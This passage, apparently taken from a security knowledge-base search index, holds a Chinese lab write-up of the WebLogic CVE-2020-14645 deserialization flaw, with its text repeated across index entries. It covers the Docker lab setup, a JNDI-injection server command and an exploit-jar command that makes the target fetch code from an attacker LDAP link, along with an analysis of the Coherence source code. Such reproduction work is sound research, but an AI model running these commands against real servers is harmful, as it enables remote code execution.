\u8ba4\u4e3a\u5e94\u638c\u63e1JNDI\u6ce8\u5165\u65b9\u6cd5\uff0c\u5e76\u6e05\u6670WebLogic\u7684coherence\u6e90\u7801\u7684\u903b\u8f91\u529f\u80fd\u3002 1.4 \u5229\u7528\u65b9\u6cd5 1.4.1 \u73af\u5883 \u00b6 \u5728 WIN10 \u7684 WSL2 \u4e0b\u7528 docker \u955c\u50cf weblogic122140jdk8u181new:latest\u3001ubuntu \u521b\u5efa\u4e09\u4e2a\u5bb9\u5668\uff0c\u79f0\u4e3aweblogic122140jdk8u181new\u3001ubuntu-JNDI\u3001ubuntu-gongji\uff0c\u4f5c\u7528\u5206\u522b\u4e3aWebLogic \u670d\u52a1\u5668\u3001JNDI\u670d\u52a1\u5668\u3001\u653b\u51fb\u673a\u3002 \u5bf9\u4e8e weblogic122140jdk8u181new \u5bb9\u5668\u3010ip:172.17.0.2\u3011\u7684\u751f\u6210\u8fc7\u7a0b\uff0c\u9700\u8981\u8fdb\u5165\u3010WeblogicEnvironment\u3011\u6587\u4ef6\u5939\uff0c\u53c2\u7167\u3010 https://github.com/QAX-A-Team/WeblogicEnvironment \u3011\u65b9\u6cd5\u5373\u53ef\u751f\u6210\uff0c\u547d\u4ee4\u662f\uff1a docker build --build-arg JDK_PKG=jdk-8u181-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.2.1.4.0_wls_lite_generic.jar -t weblogic122140jdk8u181new . docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic122140jdk8u181new weblogic122140jdk8u181new \u5bf9\u4e8e\u7531 ubuntu \u955c\u50cf\u751f\u6210\u7684 ubuntu-JNDI \u5bb9\u5668\u3010ip:172.17.0.3\u3011\uff0c\u5c06 jdk-8u181-linux-x64.tar.gz\u3001JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010 https://www.cnblogs.com/hellojesson/p/11684299.html \u3011\u5b89\u88c5\u597djdk\uff0c\u6267\u884c\u547d\u4ee4\uff1a java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE -A 172.17.0.3 \u5bf9\u4e8e\u7531ubuntu\u955c\u50cf\u751f\u6210\u7684ubuntu-gongji\u5bb9\u5668\u3010ip:172.17.0.4\u3011\uff0c\u5c06jdk-8u181-linux-x64.tar.gz\u3001CVE-2020-14645.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010 https://www.cnblogs.com/hellojesson/p/11684299.html \u3011\u5b89\u88c5\u597djdk\u3002 1.4.2 \u76ee\u6807 \u00b6 \u5728 WebLogic \u670d\u52a1\u5668\u6267\u884c\u4ee3\u7801\u3010touch /tmp/CVE\u3011\uff0c\u4ece\u800c\u5728 tmp \u6587\u4ef6\u5939\u4e0b\u751f\u6210 CVE \u6587\u4ef6\u3002 1.4.3 \u590d\u73b0 \u00b6 ubuntu-JNDI \u5bb9\u5668\u4f1a\u8f93\u51fa\u53ef\u5229\u7528\u7684 LDAP \u94fe\u63a5\uff0c\u672c\u6b21\u8f93\u5165\u7ed3\u679c\u5982\u4e0b\uff1a \u200b \u5219\u5728\u653b\u51fb\u673a ubuntu-gongji \u5bb9\u5668\u4e2d\u8f93\u5165\u8f6c\u53d1\u7c7b\u547d\u4ee4\u5982\u4e0b\uff1a \u6ce8\u610f\u6807\u7ea2\u4f4d\u7f6e LDAP \u94fe\u63a5\u5c3e\u90e8\u662f\u968f\u673a\u4ea7\u751f\u7684\uff0c\u6bcf\u6b21\u5747\u4e0d\u4e00\u6837\u3002 weblogic122140jdk8u181new \u5bb9\u5668\u4f1a\u51fa\u73b0\u7ecf\u4ee3\u7801\u6267\u884c\u540e\u751f\u6210\u7684\u6587\u4ef6\uff1a 1.4.4 \u5206\u6790\u65b9\u6cd5\u3010\u7701\u7565\u90e8\u5206\u4ee3\u7801\u5206\u6790\u3011 \u00b6 \u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4f1a\u8df3\u8f6c\u81f3\u4e0b\u56fe\u7ea2\u6846\u4e2d\u7684 coherence \u5e93\u4e2d\u6267\u884c\u90e8\u5206\u529f\u80fd\u3002 com.tangosol.util.extractor.UniversalExtractor \u7c7b\u4e2d\uff1a protected transient String m_sNameCanon; private transient TargetReflectionDescriptor m_cacheTarget; private transient boolean m_fMethod; com.tangosol.util.extractor.UniversalExtractor#extract \u65b9\u6cd5\u4e2d\u7684 com.tangosol.util.extractor.UniversalExtractor#extractComplex\u65b9\u6cd5\u4e2d\uff1a Class clzTarget = oTarget.getClass(); Class[] clzParam = ClassHelper.getClassArray(aoParam); String sCName = this.getCanonicalName();#\u3010\u65e0\u53c2\u7684\u51fd\u6570\u6216\u7a7a\u503c\u3011 boolean fProperty = this.isPropertyExtractor(); Method method = null; if (fProperty) {#\u3010\u65b9\u6cd5\u5bf9\u8c61\u7684\u83b7\u53d6\u53ea\u6709\u4e00\u4e2a\u6761\u4ef6\u3011 String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);\u3010\u9996\u5b57\u6bcd\u5927\u5199\u3011 for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) { method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);\u3010\u5bf9\u7531get/is+\u5b57\u7b26\u7ec4\u6210\u7684\u65b0\u5b57\u7b26\u8fdb\u884c\u5904\u7406\u3011\u3010ClassHelper.findMethod\u67e5\u627e\u4e0e\u6307\u5b9a\u7c7b\u3001\u65b9\u6cd5\u540d\u79f0\u548c\u53c2\u6570\u5339\u914d\u7684\u91cd\u8981\u65b9\u6cd5\u3011\u3010\u6307\u5b9a\u51fd\u6570\u5fc5\u987b\u7531\u201cget\u201d\u6216\u201cis\u201d\u5f00\u5934\uff0c\u4e14\u65e0\u53c2\u3011 } } else { method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false); } \u521d\u6b65\u8ba4\u4e3a\uff0c\u8fdb\u5165 else \u5206\u652f\u4e2d\uff0c\u5373\u53ef\u8c03\u7528\u4efb\u610f\u65b9\u6cd5\uff0c\u524d\u63d0\u662f fProperty \u4e3afalse\u3002 \u7ecf\u7814\u7a76\uff0cfProperty \u7531 !this.m_fMethod \u51b3\u5b9a\uff0c\u5176\u8d4b\u503c\u5982\u4e0b init() \u51fd\u6570\uff1a protected void init() { String sCName = this.getCanonicalName(); this.m_fMethod = sCName == null || sCName.endsWith(\"()\");#\u3010sCName\u4e3a\u65e0\u53c2\u51fd\u6570\u65f6\u7b26\u5408\u8981\u6c42\u3011 } fProperty \u65b9\u9762\uff0c\u5f53 sCName \u4e0d\u662f\u65e0\u53c2\u51fd\u6570\u4e14\u975e\u7a7a\u65f6\uff0cfProperty \u4e3a true\u3002 \u7ee7\u7eed\u5206\u6790 String sCName = this.getCanonicalName();\uff0c\u8ffd\u6eaf\u5230\u7c7bcom.oracle.common.internal.util.CanonicalNames \u7684\u65b9\u6cd5com.oracle.common.internal.util.CanonicalNames#computeValueExtractorCanonicalName(java.lang.String, java.lang.Object[])\uff1a public static String computeValueExtractorCanonicalName(String sName, Object[] aoParam) {#\u3010\u6b64\u65b9\u6cd5\u8981\u6c42\u51fd\u6570\u5fc5\u987b\u662f\u65e0\u53c2\u7684\u3011 int nMethodSuffixLength = \"()\".length(); if (aoParam != null && aoParam.length > 0) { return null;#\u3010\u53c2\u6570\u975e\u7a7a\u5219\u8fd4\u56de\u7a7a\u3011 } else if (!sName.endsWith(\"()\")) { return sName; #\u3010\u51fd\u6570\u540d\u4e0d\u4ee5\u201c()\u201d\u7ed3\u5c3e\u5219\u8fd4\u56de\u51fd\u6570\u540d\u3011 } else { String sNameCanonical = sName; int nNameLength = sName.length(); String[] var5 = VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES; #\u3010\u201cget\u201d\uff0c\u201cis\u201d\u3011 int var6 = var5.length; for(int var7 = 0; var7 < var6; ++var7) { String sPrefix = var5[var7]; int nPrefixLength = sPrefix.length(); if (nNameLength > nPrefixLength && sName.startsWith(sPrefix)) { sNameCanonical = Character.toLowerCase(sName.charAt(nPrefixLength)) + sName.substring(nPrefixLength + 1, nNameLength - nMethodSuffixLength); #\u3010\u51fd\u6570\u540d\u524d\u51e0\u4f4d\u662f\u201cget\u201d/\u201cis\u201d\uff0c\u53bb\u9664\u5c3e\u90e8\u201c()\u201d\u3011 break; } } return sNameCanonical; } } \u7efc\u4e0a\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u3002 \u65b9\u6cd51\uff1a\u5bfb\u627e\u4ee5 \u201cget\u201d/\u201cis\u201d \u5f00\u5934\u7684\u51fd\u6570\u540d\u3002\u3010\u673a\u4f1a\u8f83\u5c0f\u3011 \u65b9\u6cd52\uff1a\u4f7f fProperty \u4e3a false\uff0c\u5219\u9700\u5bfb\u627e\u4ee5\u201cget\u201d/\u201cis\u201d\u5f00\u5934\u7684\u65e0\u53c2\u51fd\u6570\u3002\u3010\u673a\u4f1a\u5f88\u5c0f\u3011 \u65b9\u6cd53\uff1a\u89c2\u5bdf extract \u5728 compare \u51fd\u6570\u4e2d\u88ab\u8c03\u7528\u4e86\u4e24\u6b21\uff0c\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u503c\u53d1\u751f\u53d8\u5316\uff0c\u4ece\u800c\u4ea7\u751f\u7f3a\u9677\u3002\u3010\u7ecf\u9a8c\u8bc1\u65e0\u6548\u3011 \u5bf9\u4e8e\u65b9\u6cd51\uff0c\u53ef\u627e\u5230\u5408\u89c4\u51fd\u6570\u540d\uff0c\u518d\u627e\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff08\u4f8b\u5982\uff0c\u63a7\u5236dataSource\uff0c\u5c31\u80fd\u63a7\u5236javax.sql.rowset.BaseRowSet#getDataSourceName\uff0c\u8fdb\u884cJNDI\u6ce8\u5165\u3002 1.5 \u8865\u4e01\u5206\u6790 \u6682\u65e0\u3002 1.6 docker\u590d\u73b0 \u52a0\u8f7d\u5bb9\u5668tar\u4e3a\u955c\u50cf\uff0c\u4f8b\u5b50\uff1a cat ./ubuntu-xxx.tar | docker import - ubuntu-new \u8bbe\u7f6e\u5c40\u57df\u7f51\u53ca\u5bb9\u5668ip\u3001\u542f\u52a8\u5bb9\u5668\uff0c\u4f8b\u5b50\uff1a \uff081\uff09\u81ea\u5b9a\u4e49\u7f51\u7edc docker network create --subnet=192.168.10.1/24 testnet \uff082\uff09\u542f\u52a8 docker \u5bb9\u5668 docker run -p 8088:8088 -p 8081:8081 -it --name testt3 --hostname testt3 --network testnet --ip 10.10.10.100 ubuntuxxx:xxx /bin/bash \u5f53\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u7684ip\u662f172.17.0.3\u3001\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\u7684ip\u662f172.17.0.5\u3001\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\u7684ip\u662f172.17.0.4\u65f6\uff0c \u542f\u52a8 weblogic \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\uff0c\u8f93\u5165\u547d\u4ee4 sh /u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh \u542f\u52a8\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u3002 \u542f\u52a8 JNDI \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4 source /etc/profile java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE110667 -A 172.17.0.3 \u53ef\u77e5\u9002\u7528\u4e8e jdk1.8 \u7684 JNDI \u8bbf\u95ee\u94fe\u63a5\u4e3a\u3010ldap://172.17.0.3:1389/usns1q\u3011\uff0c\u5982\u4e0b\u56fe\u3002 \u53d1\u8d77\u653b\u51fb\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4 source /etc/profile java -jar CVE-2020-14645.jar 172.17.0.3:1389/usns1q http://172.17.0.4:7001 \u201c172.17.0.3:1389/usns1q\u201d\u90e8\u5206\u4e3aJNDI\u94fe\u63a5\uff0c\u653b\u51fb\u6210\u529f\u4f1a\u8fd4\u56deweblogic\u7248\u672c\uff0c\u5982\u4e0b\u56fe\u3002 \u653b\u51fb\u6210\u529f\u540e\uff0c\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u4f1a\u663e\u793a\u4f20\u8f93\u4fe1\u606f\uff0c\u5982\u4e0b\u56fe\u3002 \u653b\u51fb\u6210\u529f\u540e\uff0cweblogic\u670d\u52a1\u5668\u4f1a\u751f\u6210\u3010CVE\u3011\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\u3002 1.7 \u53c2\u8003\u8d44\u6599 https://www.chainnews.com/articles/884170141841.htm https://www.freebuf.com/vuls/251540.html https://github.com/QAX-A-Team/WeblogicEnvironment https://paper.seebug.org/1012/#weblogic https://cloud.tencent.com/developer/article/1608010 https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ https://paper.seebug.org/1280/#cve-2020-14645 https://www.anquanke.com/post/id/210724","title":"WebLogic UniversalExtractor\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE 2020 14645)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#weblogic-universalextractorcve-2020-14645","text":"\u7b80\u4ecb WebLogic \u662f\u7f8e\u56fd Oracle \u516c\u53f8\u7684 Java \u5e94\u7528\u670d\u52a1\u5668\uff0c\u786e\u5207\u8bf4\u662f\u4e00\u4e2a\u4e2d\u95f4\u4ef6\uff0c\u88ab\u7528\u4e8eWEB\u5e94\u7528\u3001\u6570\u636e\u5e93\u5e94\u7528\u7b49\u7684\u96c6\u6210\u5f00\u53d1\u90e8\u7f72\u3002 WebLogic \u7684 T3 \u534f\u8bae\u6613\u88ab\u5229\u7528\uff0c\u4ece\u800c\u91c7\u7528 JNDI \u6ce8\u5165\u3001\u53cd\u5e8f\u5217\u5316\u65b9\u6cd5\u8fbe\u5230\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u7684\u76ee\u6807\u3002 \u5b58\u5728\u5b89\u5168\u7f3a\u9677\u7684\u7248\u672c\uff1aWebLogic12.2.1.4.x\uff0c\u3010JDK\u7248\u672c\uff1a6u211\u4ee5\u4e0b\uff1b7u201\u4ee5\u4e0b\uff1b8u191\u4ee5\u4e0b\u3011\u3002\u672c\u6587\u4f7f\u7528JDK1.8.0_181\u3002 1.3 \u6f0f\u6d1e\u6316\u6398\u80fd\u529b\u6761\u4ef6 \u8ba4\u4e3a\u5e94\u638c\u63e1JNDI\u6ce8\u5165\u65b9\u6cd5\uff0c\u5e76\u6e05\u6670WebLogic\u7684coherence\u6e90\u7801\u7684\u903b\u8f91\u529f\u80fd\u3002 1.4 \u5229\u7528\u65b9\u6cd5","title":"WebLogic UniversalExtractor\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e(CVE-2020-14645)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#141","text":"\u5728 WIN10 \u7684 WSL2 \u4e0b\u7528 docker \u955c\u50cf weblogic122140jdk8u181new:latest\u3001ubuntu \u521b\u5efa\u4e09\u4e2a\u5bb9\u5668\uff0c\u79f0\u4e3aweblogic122140jdk8u181new\u3001ubuntu-JNDI\u3001ubuntu-gongji\uff0c\u4f5c\u7528\u5206\u522b\u4e3aWebLogic \u670d\u52a1\u5668\u3001JNDI\u670d\u52a1\u5668\u3001\u653b\u51fb\u673a\u3002 \u5bf9\u4e8e weblogic122140jdk8u181new \u5bb9\u5668\u3010ip:172.17.0.2\u3011\u7684\u751f\u6210\u8fc7\u7a0b\uff0c\u9700\u8981\u8fdb\u5165\u3010WeblogicEnvironment\u3011\u6587\u4ef6\u5939\uff0c\u53c2\u7167\u3010 https://github.com/QAX-A-Team/WeblogicEnvironment \u3011\u65b9\u6cd5\u5373\u53ef\u751f\u6210\uff0c\u547d\u4ee4\u662f\uff1a docker build --build-arg JDK_PKG=jdk-8u181-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=fmw_12.2.1.4.0_wls_lite_generic.jar -t weblogic122140jdk8u181new . docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic122140jdk8u181new weblogic122140jdk8u181new \u5bf9\u4e8e\u7531 ubuntu \u955c\u50cf\u751f\u6210\u7684 ubuntu-JNDI \u5bb9\u5668\u3010ip:172.17.0.3\u3011\uff0c\u5c06 jdk-8u181-linux-x64.tar.gz\u3001JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010 https://www.cnblogs.com/hellojesson/p/11684299.html \u3011\u5b89\u88c5\u597djdk\uff0c\u6267\u884c\u547d\u4ee4\uff1a java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE -A 172.17.0.3 \u5bf9\u4e8e\u7531ubuntu\u955c\u50cf\u751f\u6210\u7684ubuntu-gongji\u5bb9\u5668\u3010ip:172.17.0.4\u3011\uff0c\u5c06jdk-8u181-linux-x64.tar.gz\u3001CVE-2020-14645.jar\u62f7\u8d1d\u81f3\u5bb9\u5668\u5185\uff0c\u53c2\u7167\u3010 https://www.cnblogs.com/hellojesson/p/11684299.html \u3011\u5b89\u88c5\u597djdk\u3002","title":"1.4.1 \u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#142","text":"\u5728 WebLogic \u670d\u52a1\u5668\u6267\u884c\u4ee3\u7801\u3010touch /tmp/CVE\u3011\uff0c\u4ece\u800c\u5728 tmp \u6587\u4ef6\u5939\u4e0b\u751f\u6210 CVE \u6587\u4ef6\u3002","title":"1.4.2 \u76ee\u6807"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#143","text":"ubuntu-JNDI \u5bb9\u5668\u4f1a\u8f93\u51fa\u53ef\u5229\u7528\u7684 LDAP \u94fe\u63a5\uff0c\u672c\u6b21\u8f93\u5165\u7ed3\u679c\u5982\u4e0b\uff1a \u200b \u5219\u5728\u653b\u51fb\u673a ubuntu-gongji \u5bb9\u5668\u4e2d\u8f93\u5165\u8f6c\u53d1\u7c7b\u547d\u4ee4\u5982\u4e0b\uff1a \u6ce8\u610f\u6807\u7ea2\u4f4d\u7f6e LDAP \u94fe\u63a5\u5c3e\u90e8\u662f\u968f\u673a\u4ea7\u751f\u7684\uff0c\u6bcf\u6b21\u5747\u4e0d\u4e00\u6837\u3002 weblogic122140jdk8u181new \u5bb9\u5668\u4f1a\u51fa\u73b0\u7ecf\u4ee3\u7801\u6267\u884c\u540e\u751f\u6210\u7684\u6587\u4ef6\uff1a","title":"1.4.3 \u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WebLogic%20UniversalExtractor%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%28CVE-2020-14645%29/#144","text":"\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u4f1a\u8df3\u8f6c\u81f3\u4e0b\u56fe\u7ea2\u6846\u4e2d\u7684 coherence \u5e93\u4e2d\u6267\u884c\u90e8\u5206\u529f\u80fd\u3002 com.tangosol.util.extractor.UniversalExtractor \u7c7b\u4e2d\uff1a protected transient String m_sNameCanon; private transient TargetReflectionDescriptor m_cacheTarget; private transient boolean m_fMethod; com.tangosol.util.extractor.UniversalExtractor#extract \u65b9\u6cd5\u4e2d\u7684 com.tangosol.util.extractor.UniversalExtractor#extractComplex\u65b9\u6cd5\u4e2d\uff1a Class clzTarget = oTarget.getClass(); Class[] clzParam = ClassHelper.getClassArray(aoParam); String sCName = this.getCanonicalName();#\u3010\u65e0\u53c2\u7684\u51fd\u6570\u6216\u7a7a\u503c\u3011 boolean fProperty = this.isPropertyExtractor(); Method method = null; if (fProperty) {#\u3010\u65b9\u6cd5\u5bf9\u8c61\u7684\u83b7\u53d6\u53ea\u6709\u4e00\u4e2a\u6761\u4ef6\u3011 String sBeanAttribute = Character.toUpperCase(sCName.charAt(0)) + sCName.substring(1);\u3010\u9996\u5b57\u6bcd\u5927\u5199\u3011 for(int cchPrefix = 0; cchPrefix < BEAN_ACCESSOR_PREFIXES.length && method == null; ++cchPrefix) { method = ClassHelper.findMethod(clzTarget, BEAN_ACCESSOR_PREFIXES[cchPrefix] + sBeanAttribute, clzParam, false);\u3010\u5bf9\u7531get/is+\u5b57\u7b26\u7ec4\u6210\u7684\u65b0\u5b57\u7b26\u8fdb\u884c\u5904\u7406\u3011\u3010ClassHelper.findMethod\u67e5\u627e\u4e0e\u6307\u5b9a\u7c7b\u3001\u65b9\u6cd5\u540d\u79f0\u548c\u53c2\u6570\u5339\u914d\u7684\u91cd\u8981\u65b9\u6cd5\u3011\u3010\u6307\u5b9a\u51fd\u6570\u5fc5\u987b\u7531\u201cget\u201d\u6216\u201cis\u201d\u5f00\u5934\uff0c\u4e14\u65e0\u53c2\u3011 } } else { method = ClassHelper.findMethod(clzTarget, this.getMethodName(), clzParam, false); } \u521d\u6b65\u8ba4\u4e3a\uff0c\u8fdb\u5165 else \u5206\u652f\u4e2d\uff0c\u5373\u53ef\u8c03\u7528\u4efb\u610f\u65b9\u6cd5\uff0c\u524d\u63d0\u662f fProperty \u4e3afalse\u3002 \u7ecf\u7814\u7a76\uff0cfProperty \u7531 !this.m_fMethod \u51b3\u5b9a\uff0c\u5176\u8d4b\u503c\u5982\u4e0b init() \u51fd\u6570\uff1a protected void init() { String sCName = this.getCanonicalName(); this.m_fMethod = sCName == null || sCName.endsWith(\"()\");#\u3010sCName\u4e3a\u65e0\u53c2\u51fd\u6570\u65f6\u7b26\u5408\u8981\u6c42\u3011 } fProperty \u65b9\u9762\uff0c\u5f53 sCName \u4e0d\u662f\u65e0\u53c2\u51fd\u6570\u4e14\u975e\u7a7a\u65f6\uff0cfProperty \u4e3a true\u3002 \u7ee7\u7eed\u5206\u6790 String sCName = this.getCanonicalName();\uff0c\u8ffd\u6eaf\u5230\u7c7bcom.oracle.common.internal.util.CanonicalNames \u7684\u65b9\u6cd5com.oracle.common.internal.util.CanonicalNames#computeValueExtractorCanonicalName(java.lang.String, java.lang.Object[])\uff1a public static String computeValueExtractorCanonicalName(String sName, Object[] aoParam) {#\u3010\u6b64\u65b9\u6cd5\u8981\u6c42\u51fd\u6570\u5fc5\u987b\u662f\u65e0\u53c2\u7684\u3011 int nMethodSuffixLength = \"()\".length(); if (aoParam != null && aoParam.length > 0) { return null;#\u3010\u53c2\u6570\u975e\u7a7a\u5219\u8fd4\u56de\u7a7a\u3011 } else if (!sName.endsWith(\"()\")) { return sName; #\u3010\u51fd\u6570\u540d\u4e0d\u4ee5\u201c()\u201d\u7ed3\u5c3e\u5219\u8fd4\u56de\u51fd\u6570\u540d\u3011 } else { String sNameCanonical = sName; int nNameLength = sName.length(); String[] var5 = VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES; #\u3010\u201cget\u201d\uff0c\u201cis\u201d\u3011 int var6 = var5.length; for(int var7 = 0; var7 < var6; ++var7) { String sPrefix = var5[var7]; int nPrefixLength = sPrefix.length(); if (nNameLength > nPrefixLength && sName.startsWith(sPrefix)) { sNameCanonical = Character.toLowerCase(sName.charAt(nPrefixLength)) + sName.substring(nPrefixLength + 1, nNameLength - nMethodSuffixLength); #\u3010\u51fd\u6570\u540d\u524d\u51e0\u4f4d\u662f\u201cget\u201d/\u201cis\u201d\uff0c\u53bb\u9664\u5c3e\u90e8\u201c()\u201d\u3011 break; } } return sNameCanonical; } } \u7efc\u4e0a\uff0c\u6709\u4e09\u79cd\u65b9\u6cd5\u3002 \u65b9\u6cd51\uff1a\u5bfb\u627e\u4ee5 \u201cget\u201d/\u201cis\u201d \u5f00\u5934\u7684\u51fd\u6570\u540d\u3002\u3010\u673a\u4f1a\u8f83\u5c0f\u3011 \u65b9\u6cd52\uff1a\u4f7f fProperty \u4e3a false\uff0c\u5219\u9700\u5bfb\u627e\u4ee5\u201cget\u201d/\u201cis\u201d\u5f00\u5934\u7684\u65e0\u53c2\u51fd\u6570\u3002\u3010\u673a\u4f1a\u5f88\u5c0f\u3011 \u65b9\u6cd53\uff1a\u89c2\u5bdf extract \u5728 compare \u51fd\u6570\u4e2d\u88ab\u8c03\u7528\u4e86\u4e24\u6b21\uff0c\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u503c\u53d1\u751f\u53d8\u5316\uff0c\u4ece\u800c\u4ea7\u751f\u7f3a\u9677\u3002\u3010\u7ecf\u9a8c\u8bc1\u65e0\u6548\u3011 \u5bf9\u4e8e\u65b9\u6cd51\uff0c\u53ef\u627e\u5230\u5408\u89c4\u51fd\u6570\u540d\uff0c\u518d\u627e\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff08\u4f8b\u5982\uff0c\u63a7\u5236dataSource\uff0c\u5c31\u80fd\u63a7\u5236javax.sql.rowset.BaseRowSet#getDataSourceName\uff0c\u8fdb\u884cJNDI\u6ce8\u5165\u3002 1.5 \u8865\u4e01\u5206\u6790 \u6682\u65e0\u3002 1.6 docker\u590d\u73b0 \u52a0\u8f7d\u5bb9\u5668tar\u4e3a\u955c\u50cf\uff0c\u4f8b\u5b50\uff1a cat ./ubuntu-xxx.tar | docker import - ubuntu-new \u8bbe\u7f6e\u5c40\u57df\u7f51\u53ca\u5bb9\u5668ip\u3001\u542f\u52a8\u5bb9\u5668\uff0c\u4f8b\u5b50\uff1a \uff081\uff09\u81ea\u5b9a\u4e49\u7f51\u7edc docker network create --subnet=192.168.10.1/24 testnet \uff082\uff09\u542f\u52a8 docker \u5bb9\u5668 docker run -p 8088:8088 -p 8081:8081 -it --name testt3 --hostname testt3 --network testnet --ip 10.10.10.100 ubuntuxxx:xxx /bin/bash \u5f53\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u7684ip\u662f172.17.0.3\u3001\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\u7684ip\u662f172.17.0.5\u3001\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\u7684ip\u662f172.17.0.4\u65f6\uff0c \u542f\u52a8 weblogic \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010weblogic122140jdk8u181new1106\u3011\uff0c\u8f93\u5165\u547d\u4ee4 sh /u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh \u542f\u52a8\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u3002 \u542f\u52a8 JNDI \u670d\u52a1\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4 source /etc/profile java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/CVE110667 -A 172.17.0.3 \u53ef\u77e5\u9002\u7528\u4e8e jdk1.8 \u7684 JNDI \u8bbf\u95ee\u94fe\u63a5\u4e3a\u3010ldap://172.17.0.3:1389/usns1q\u3011\uff0c\u5982\u4e0b\u56fe\u3002 \u53d1\u8d77\u653b\u51fb\u3002\u8fdb\u5165\u5bb9\u5668\u3010ubuntu-gongji1106\u3011\uff0c\u4f9d\u6b21\u8f93\u5165\u547d\u4ee4 source /etc/profile java -jar CVE-2020-14645.jar 172.17.0.3:1389/usns1q http://172.17.0.4:7001 \u201c172.17.0.3:1389/usns1q\u201d\u90e8\u5206\u4e3aJNDI\u94fe\u63a5\uff0c\u653b\u51fb\u6210\u529f\u4f1a\u8fd4\u56deweblogic\u7248\u672c\uff0c\u5982\u4e0b\u56fe\u3002 \u653b\u51fb\u6210\u529f\u540e\uff0c\u5bb9\u5668\u3010ubuntu-JNDI1106\u3011\u4f1a\u663e\u793a\u4f20\u8f93\u4fe1\u606f\uff0c\u5982\u4e0b\u56fe\u3002 \u653b\u51fb\u6210\u529f\u540e\uff0cweblogic\u670d\u52a1\u5668\u4f1a\u751f\u6210\u3010CVE\u3011\u6587\u4ef6\uff0c\u5982\u4e0b\u56fe\u3002 1.7 \u53c2\u8003\u8d44\u6599 https://www.chainnews.com/articles/884170141841.htm 